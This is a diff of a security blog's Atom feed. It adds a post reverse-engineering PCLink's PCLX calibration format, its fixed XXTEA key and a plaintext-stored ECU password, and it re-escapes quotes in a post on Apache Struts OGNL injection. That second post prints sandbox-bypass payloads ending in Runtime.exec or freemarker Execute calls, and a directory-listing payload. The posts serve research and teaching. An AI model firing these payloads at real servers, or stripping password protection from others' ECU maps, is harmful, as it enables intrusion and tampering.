class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;kt&quot;&gt;uint&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;last&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;words&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;words&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Length&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;words&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Mix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;last&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0x9E3779B9u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Accepting an output just because it had &lt;em&gt;some&lt;/em&gt; printable character in it would’ve been a weak validation. So the script demanded four conditions:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;The input file had to be a multiple of four bytes.&lt;/li&gt;
+  &lt;li&gt;The length stored in the second DWORD had to fit inside the container.&lt;/li&gt;
+  &lt;li&gt;The payload had to start with an XML declaration.&lt;/li&gt;
+  &lt;li&gt;The XML had to be well-formed and have &lt;code class=&quot;highlighter-rouge&quot;&gt;LinkStorage&lt;/code&gt; as its root.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;The sample Honda map spat out this:&lt;/p&gt;
+
+&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;random DWORD:     0x000B865E
+payload length:   563701
+validation DWORD: 0x00000000
+payload:          &amp;lt;?xml version=&quot;1.0&quot;?&amp;gt;
+                  &amp;lt;LinkStorage Version=&quot;100&quot; Type=&quot;.xml&quot;&amp;gt; ...
+padding:          00 00 00
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;That result confirmed the algorithm, the key, and the header structure all at once. The alternative key returned, for example, a length of several million for a half-megabyte file, so I could rule it out objectively.&lt;/p&gt;
+
+&lt;p&gt;As an extra sanity check, I decrypted &lt;code class=&quot;highlighter-rouge&quot;&gt;ECU.cfgr&lt;/code&gt;, which installs alongside PCLink. It used the same container and revealed an XML parameter base of &lt;code class=&quot;highlighter-rouge&quot;&gt;2,438,771&lt;/code&gt; bytes. This file turned out to be the key to putting names on the password fields.&lt;/p&gt;
+
+&lt;h3 id=&quot;7-locating-the-password-inside-linkstorage&quot;&gt;7. Locating the password inside &lt;code class=&quot;highlighter-rouge&quot;&gt;LinkStorage&lt;/code&gt;&lt;/h3&gt;
+
+&lt;p&gt;The ECUrecovery article I mentioned earlier might already get you there, but its technique is a bit janky, it basically just searches for literals that look like a password. What I wanted was to automate this with zero human input.&lt;/p&gt;
+
+&lt;p&gt;So once I had the XML, I searched for password-related terms and looked up specific definitions by &lt;code class=&quot;highlighter-rouge&quot;&gt;DataId&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;ECU.cfgr&lt;/code&gt;. Four relevant parameters showed up:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: right&quot;&gt;DataId&lt;/th&gt;
+      &lt;th&gt;Name in the parameter base&lt;/th&gt;
+      &lt;th&gt;Representation&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: right&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;2294&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Master Password G4&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;Vector of 20 values between 0 and 255&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: right&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;2295&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;User Password G4&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;Copies the definition from 2294&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: right&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;2303&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Password Settings&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;Internal state and options&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: right&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;2324&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Password Protection&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;State visible in PCLink&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;The definition for 2294 specifies one row, twenty columns, min zero, max 255, and a default made of twenty zeros. On a map with no password it looks like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;D2294&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;DataId=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2294&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RowCount=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;ColCount=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;20&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Count=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;20&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;Row0&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/D2294&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;D2295&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;DataId=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2295&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RowCount=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;ColCount=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;20&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Count=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;20&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;Row0&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/D2295&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;On the protected map I used as a sample, D2294 contained:&lt;/p&gt;
+
+&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;112,101,112,101,49,50,51,0,0,0,0,0,0,0,0,0,0,0,0,0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Converting each non-zero value straight to a character gives you:&lt;/p&gt;
+
+&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;112 -&amp;gt; p
+101 -&amp;gt; e
+112 -&amp;gt; p
+101 -&amp;gt; e
+ 49 -&amp;gt; 1
+ 50 -&amp;gt; 2
+ 51 -&amp;gt; 3
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The test password, &lt;code class=&quot;highlighter-rouge&quot;&gt;pepe123&lt;/code&gt;, was recovered with zero brute force. No hash, no salt, no key derivation function, just the numeric character codes sitting inside the XML, even though the whole XML &lt;em&gt;was&lt;/em&gt; covered by the XXTEA layer.&lt;/p&gt;
+
+&lt;h3 id=&quot;conclusions&quot;&gt;Conclusions&lt;/h3&gt;
+
+&lt;p&gt;The PCLX format I looked at has two layers you really don’t want to mix up. The first is an XXTEA container with a fixed 128-bit key baked into PCLink. Its practical job is to stop the file from exposing the XML directly. The second is Password Protection, implemented through two vectors inside that XML.&lt;/p&gt;
+
+&lt;p&gt;The password the user types in doesn’t derive the XXTEA key, isn’t stored as a hash, and doesn’t individually encrypt the calibration. PCLink stores it as character codes in D2294 and figures out the state by comparing it against D2295. Because of that, anyone who can reproduce the outer container layer can recover the value and rebuild an unprotected copy.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Save as Encrypted&lt;/code&gt; adds an ECU-tied check via the third header DWORD, but it’s still a separate path from Password Protection.&lt;/p&gt;
+
+&lt;p&gt;The result is specific to PCLink G5 7.8.2. An update could change the key, the addresses, the parameter IDs, or even the whole format. The methodology, though, still holds up: inventory the binary, hunt for constants and strings, follow the calls, come up with hypotheses, validate them against real files, and demand a round-trip proof before you call the format “understood”.
+&amp;lt;/content&amp;gt;
+&amp;lt;/invoke&amp;gt;&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      
+
+      
+        <category term="reversing" />
+      
+        <category term="code" />
+      
+        <category term="hardware" />
+      
+
+      
+
+      
+        <summary type="html">Disclaimer: The following article is for informational and awareness purposes only. Any notable findings during this investigation have been reported using the appropriate channels.</summary>
+      
+
+      
+      
+    </entry>
+  
   
   
     <entry>
@@ -164,7 +592,7 @@
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;The ValueStack is the default object to be accessed,  As its name says, it’s a stack, values are pushed and poped on the stack, but OGNL sees the ValueStack as a single object.&lt;/p&gt;
 
-&lt;p&gt;To access other non-root objects (objects which aren’t on the ValueStack) we can use the “#” prefix, for example: &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;s:property value=&quot;#session['mySessionPropKey']&quot;/&amp;gt;&lt;/code&gt;  or &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;s:property value=&quot;%{#session['mySessionPropKey']}&quot;/&amp;gt;&lt;/code&gt; (they are equivalent, the %{} just forces the evaluation).&lt;/p&gt;
+&lt;p&gt;To access other non-root objects (objects which aren’t on the ValueStack) we can use the “#” prefix, for example: &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;s:property value=&quot;#session[&apos;mySessionPropKey&apos;]&quot;/&amp;gt;&lt;/code&gt;  or &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;s:property value=&quot;%{#session[&apos;mySessionPropKey&apos;]}&quot;/&amp;gt;&lt;/code&gt; (they are equivalent, the %{} just forces the evaluation).&lt;/p&gt;
 
 &lt;h3 id=&quot;ognl-syntax&quot;&gt;OGNL syntax.&lt;/h3&gt;
 
@@ -186,13 +614,13 @@
 &lt;h4 id=&quot;access-static-objects&quot;&gt;Access static objects.&lt;/h4&gt;
 
 &lt;p&gt;To access static functions of classes, OGNL provides the &lt;code class=&quot;highlighter-rouge&quot;&gt;@&lt;/code&gt; prefix:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;(#a = @java.lang.String@valueOf('test'))&lt;/code&gt; will create an String object with ‘test’ string, note that as we are calling the static valueOf method, we need to use the &lt;code class=&quot;highlighter-rouge&quot;&gt;@&lt;/code&gt;prefix both on the class name and the method name.&lt;/p&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;(#a = @java.lang.String@valueOf(&apos;test&apos;))&lt;/code&gt; will create an String object with ‘test’ string, note that as we are calling the static valueOf method, we need to use the &lt;code class=&quot;highlighter-rouge&quot;&gt;@&lt;/code&gt;prefix both on the class name and the method name.&lt;/p&gt;
 
 &lt;h4 id=&quot;conditionals&quot;&gt;Conditionals.&lt;/h4&gt;
 
 &lt;p&gt;OGNL let you implement conditional branches using the ternary operator &lt;code class=&quot;highlighter-rouge&quot;&gt;?&lt;/code&gt; as in many other languages.&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;(#os = @java.lang.System@getProperty('os.name')).(#os == 'Linux' ? &amp;lt;true&amp;gt; : &amp;lt;false&amp;gt;)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;(#os = @java.lang.System@getProperty(&apos;os.name&apos;)).(#os == &apos;Linux&apos; ? &amp;lt;true&amp;gt; : &amp;lt;false&amp;gt;)&lt;/code&gt;&lt;/p&gt;
 
 &lt;h4 id=&quot;loops&quot;&gt;Loops.&lt;/h4&gt;
 &lt;p&gt;There’s not so much examples about OGNL loops on the internet. To perform loops on OGNL we use the brackets syntax.&lt;/p&gt;
@@ -215,16 +643,16 @@
 
 &lt;p&gt;Let’s explain it better some expression snippets.&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;%{(#a = new java.lang.String('test')}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;%{(#a = new java.lang.String(&apos;test&apos;)}&lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;or&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;%{(#a = @java.lang.String@valueOf('test'))}&lt;/code&gt; to call static methods.&lt;/p&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;%{(#a = @java.lang.String@valueOf(&apos;test&apos;))}&lt;/code&gt; to call static methods.&lt;/p&gt;
 
 &lt;h4 id=&quot;inline-hash-instantiation&quot;&gt;Inline hash instantiation.&lt;/h4&gt;
 &lt;p&gt;OGNL allows to instantiate and fill a hash map using a curly braces notation, for example:&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;%{(#a = #@java.util.LinkedHashMap@{'foo':'value'})}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;%{(#a = #@java.util.LinkedHashMap@{&apos;foo&apos;:&apos;value&apos;})}&lt;/code&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;when-ognl-injection-occurs&quot;&gt;When OGNL injection occurs?&lt;/h3&gt;
 
@@ -247,7 +675,7 @@
 &lt;h4 id=&quot;bypass-1-before-struts-2314&quot;&gt;Bypass 1. Before Struts 2.3.14.&lt;/h4&gt;
 &lt;p&gt;Before Struts 2.3.20, the &lt;code class=&quot;highlighter-rouge&quot;&gt;@_memberAccess&lt;/code&gt; attribute was accesible, so you could simply stablish the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;allowStaticMethodAccess&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;true&lt;/code&gt; like this:&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;%{(#_memberAccess['allowStaticMethodAccess']=true).(&amp;lt;whatever you want to do&amp;gt;)}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;%{(#_memberAccess[&apos;allowStaticMethodAccess&apos;]=true).(&amp;lt;whatever you want to do&amp;gt;)}&lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;Struts team decided to make &lt;code class=&quot;highlighter-rouge&quot;&gt;allowStaticMethodAccess&lt;/code&gt; final, to prevent it’s value from beign changed on runtime.&lt;/p&gt;
 
@@ -267,12 +695,12 @@
 
 &lt;p&gt;So, now what? Let’s take a look at the on the wild found exploit for this Struts version.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(#container=#context['com.opensymphony.xwork2.ActionContext.container']).
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).
 (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
 (#ognlUtil.excludedClasses.clear()).
 (#ognlUtil.excludedPackageNames.clear()).
 (#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).
-(@java.lang.Runtime@getRuntime().exec('&amp;lt;whatever to execute&amp;gt;'))
+(@java.lang.Runtime@getRuntime().exec(&apos;&amp;lt;whatever to execute&amp;gt;&apos;))
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;As you can see, &lt;code class=&quot;highlighter-rouge&quot;&gt;#context&lt;/code&gt; still accessible, so we can get an instance of &lt;code class=&quot;highlighter-rouge&quot;&gt;OgnlUtil&lt;/code&gt; which is not blacklisted and clear the excludedClasses and excludedPackages list. After that using the setter method, we can set the member access to the &lt;code class=&quot;highlighter-rouge&quot;&gt;DefaultMemberAccess&lt;/code&gt;, because excludedClasses is cleared.&lt;/p&gt;
@@ -282,25 +710,25 @@
 
 &lt;p&gt;Access to &lt;code class=&quot;highlighter-rouge&quot;&gt;#context&lt;/code&gt; is not available anymore, so we need to find a way to access &lt;code class=&quot;highlighter-rouge&quot;&gt;ActionContext&lt;/code&gt; class.&lt;/p&gt;
 
-&lt;p&gt;Man Yue Mo found a way to bypass the &lt;code class=&quot;highlighter-rouge&quot;&gt;#context&lt;/code&gt; access restriction using two requests, the first, access &lt;code class=&quot;highlighter-rouge&quot;&gt;#context&lt;/code&gt; using &lt;code class=&quot;highlighter-rouge&quot;&gt;#attr['struts.ValueStack'].context&lt;/code&gt; and clears &lt;code class=&quot;highlighter-rouge&quot;&gt;excludedClasses&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;excludedPackages&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Man Yue Mo found a way to bypass the &lt;code class=&quot;highlighter-rouge&quot;&gt;#context&lt;/code&gt; access restriction using two requests, the first, access &lt;code class=&quot;highlighter-rouge&quot;&gt;#context&lt;/code&gt; using &lt;code class=&quot;highlighter-rouge&quot;&gt;#attr[&apos;struts.ValueStack&apos;].context&lt;/code&gt; and clears &lt;code class=&quot;highlighter-rouge&quot;&gt;excludedClasses&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;excludedPackages&lt;/code&gt;.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(#context=#attr['struts.valueStack'].context).
-(#container=#context['com.opensymphony.xwork2.ActionContext.container']).
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(#context=#attr[&apos;struts.valueStack&apos;].context).
+(#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).
 (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
-(#ognlUtil.setExcludedClasses('')).
-(#ognlUtil.setExcludedPackageNames(''))
+(#ognlUtil.setExcludedClasses(&apos;&apos;)).
+(#ognlUtil.setExcludedPackageNames(&apos;&apos;))
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;And the second request, sets &lt;code class=&quot;highlighter-rouge&quot;&gt;#_memberAccess&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;DefaultMemberAccess&lt;/code&gt; as always.&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(#context=#attr['struts.valueStack'].context).
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(#context=#attr[&apos;struts.valueStack&apos;].context).
 (#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).
-(@java.lang.Runtime@getRuntime().exec('&amp;lt;whatever to execute&amp;gt;'))
+(@java.lang.Runtime@getRuntime().exec(&apos;&amp;lt;whatever to execute&amp;gt;&apos;))
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h4 id=&quot;bypass-5-before-struts-2522-bypass-of-s2-059&quot;&gt;Bypass 5. Before Struts 2.5.22. (Bypass of S2-059)&lt;/h4&gt;
 &lt;p&gt;CVE-2020-17530 exploits a double-evaluation vulnerability on Struts, similar to the previous one. This vulnerability was found by the great Alvaro Muñoz and Masato Anzai, they didn’t published a bypass for the S2-059 restrictions, but an exploit was found on the wild.&lt;/p&gt;
 
-&lt;p&gt;Access to &lt;code class=&quot;highlighter-rouge&quot;&gt;#context&lt;/code&gt; using the &lt;code class=&quot;highlighter-rouge&quot;&gt;#attr['struts.valueStack']&lt;/code&gt; is no longer available, so an alternative way to access &lt;code class=&quot;highlighter-rouge&quot;&gt;#context&lt;/code&gt; need to be found. Also &lt;code class=&quot;highlighter-rouge&quot;&gt;com.opensymphony.xwork2.ActionContext&lt;/code&gt; is now on the blacklist of &lt;code class=&quot;highlighter-rouge&quot;&gt;excludedClasses&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Access to &lt;code class=&quot;highlighter-rouge&quot;&gt;#context&lt;/code&gt; using the &lt;code class=&quot;highlighter-rouge&quot;&gt;#attr[&apos;struts.valueStack&apos;]&lt;/code&gt; is no longer available, so an alternative way to access &lt;code class=&quot;highlighter-rouge&quot;&gt;#context&lt;/code&gt; need to be found. Also &lt;code class=&quot;highlighter-rouge&quot;&gt;com.opensymphony.xwork2.ActionContext&lt;/code&gt; is now on the blacklist of &lt;code class=&quot;highlighter-rouge&quot;&gt;excludedClasses&lt;/code&gt;.&lt;/p&gt;
 
 &lt;p&gt;The exploit is dissected for a better reading experience.&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(#instancemanager=#application[&quot;org.apache.tomcat.InstanceManager&quot;]).
@@ -347,18 +775,18 @@ excludedClasses&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt
 &lt;p&gt;There’s no restrictions for accessing &lt;code class=&quot;highlighter-rouge&quot;&gt;org.apache.commons.collections.*&lt;/code&gt; so the bypass is clear.&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(#request.map=#@org.apache.commons.collections.BeanMap@{})
-(#request.map.setBean(#request.get('struts.valueStack')))
+(#request.map.setBean(#request.get(&apos;struts.valueStack&apos;)))
 
 (#request.map2=#@org.apache.commons.collections.BeanMap@{})
-(#request.map2.setBean(#request.get('map').get('context')))
+(#request.map2.setBean(#request.get(&apos;map&apos;).get(&apos;context&apos;)))
 
 (#request.map3=#@org.apache.commons.collections.BeanMap@{})
-(#request.map3.setBean(#request.get('map2').get('memberAccess')))
+(#request.map3.setBean(#request.get(&apos;map2&apos;).get(&apos;memberAccess&apos;)))
 
-(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet())) 
-(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()))
+(#request.get(&apos;map3&apos;).put(&apos;excludedPackageNames&apos;,#@org.apache.commons.collections.BeanMap@{}.keySet())) 
+(#request.get(&apos;map3&apos;).put(&apos;excludedClasses&apos;,#@org.apache.commons.collections.BeanMap@{}.keySet()))
 
-(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec(&amp;lt;whatever to execute&amp;gt;))
+(#application.get(&apos;org.apache.tomcat.InstanceManager&apos;).newInstance(&apos;freemarker.template.utility.Execute&apos;).exec(&amp;lt;whatever to execute&amp;gt;))
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;The first two lines creates a &lt;code class=&quot;highlighter-rouge&quot;&gt;BeanMap&lt;/code&gt; using the curly braces technique, and stores it into &lt;code class=&quot;highlighter-rouge&quot;&gt;#request.map&lt;/code&gt;, you can also use &lt;code class=&quot;highlighter-rouge&quot;&gt;#application.map&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;#attr.map&lt;/code&gt;, whatever you want. Then, gets the &lt;code class=&quot;highlighter-rouge&quot;&gt;ValueStack&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;struts.valueStack&lt;/code&gt; as seen on previous payloads, setting the and sets the &lt;code class=&quot;highlighter-rouge&quot;&gt;BeanMap&lt;/code&gt; created earlier to the &lt;code class=&quot;highlighter-rouge&quot;&gt;ValueStack&lt;/code&gt; instance.&lt;/p&gt;
@@ -438,14 +866,14 @@ java.lang.ClassLoader
 &lt;h4 id=&quot;list-files-ls&quot;&gt;List files (ls)&lt;/h4&gt;
 &lt;p&gt;To list files as &lt;code class=&quot;highlighter-rouge&quot;&gt;ls&lt;/code&gt; command does, we need to use an OGNL loop over to read the desired directory.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(#fol = new java.io.File('#{ls_path}')).(#fileNames = #fol.list()).(#finalStr=@java.lang.String@valueOf('')).(#i=0).(#fileNames.{(#c=#fileNames[#i]).(#i=#i+1).(#finalStr=#finalStr.concat(#c+\&quot;\\n\&quot;))}).(#o=#finalStr)
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(#fol = new java.io.File(&apos;#{ls_path}&apos;)).(#fileNames = #fol.list()).(#finalStr=@java.lang.String@valueOf(&apos;&apos;)).(#i=0).(#fileNames.{(#c=#fileNames[#i]).(#i=#i+1).(#finalStr=#finalStr.concat(#c+\&quot;\\n\&quot;))}).(#o=#finalStr)
